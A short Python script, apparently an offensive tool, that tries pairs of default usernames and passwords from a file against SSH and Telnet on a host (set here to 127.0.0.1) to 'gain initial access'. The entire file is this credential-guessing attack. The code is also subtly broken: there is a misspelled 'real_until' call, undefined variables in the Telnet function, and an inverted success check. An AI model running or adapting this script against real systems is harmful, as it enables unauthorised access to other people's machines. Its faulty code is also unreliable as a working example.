#default acc technique to gain initial access
import paramiko
import telnetlib

def SSHLogin( host, port, usrnm, pwrd):
    try:
        ssh= paramiko.SSHClient()
        ssh.set_missing_host_key_policy( paramiko.AutoAddPolicy() )
        ssh.connect(host, port=port, username=usrnm, password=pwrd)
        ssh_session= ssh.get_transport().open_session()
        if ssh_session.active:
            print( "SSH login successful at %s:%s with username: %s and password %s" %(host, port, usrnm, pwrd))
    except Exception as e:
        return
    ssh.close()

def Telnetlogin( host, port, username, password):
    user= bytes( username+ "\n", "utf-8")
    pwrd= bytes( password+ "\n", "utf-8")

    tn= telnetlib.Telnet( host, port)
    tn.real_until( bytes("login: ", "utf-8")) #prompt critical
    tn.write(user)
    tn.read_until( bytes("password: ", "utf-8")) #prompt critical
    tn.write(pwrd)
    try:
        result= tn.expect( [ bytes( "Last login: ", "utf-8")], timeout=2)
        if result[0]>0:
            print( "Telnet login successful at %s:%s with username: %s and password %s" %(host, port, usrnm, pwrd))
        tn.close()
    except EOFError:
        print("login failure")




host="127.0.0.1"
with open("defaults.txt", "r") as f:
    for line in f:
        vals= line.split()
        username= vals[0].strip()
        password= vals[1].strip()
        SSHLogin(host, 22, username, password)
        Telnetlogin( host, 23, username, password)